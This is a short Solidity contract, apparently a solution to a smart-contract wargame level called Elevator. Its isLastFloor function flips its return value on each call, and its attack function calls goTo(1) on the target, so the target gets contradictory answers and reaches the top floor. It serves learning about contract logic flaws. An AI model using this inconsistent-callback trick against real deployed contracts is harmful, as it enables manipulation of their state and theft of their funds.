// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Solution {
    bool top = true;

    function isLastFloor(uint256 i) external returns (bool) {
        top = !top;
        return top;
    }

    function attack(address _target) public {
        Elevator target = Elevator(_target);
        target.goTo(1);
    }
}
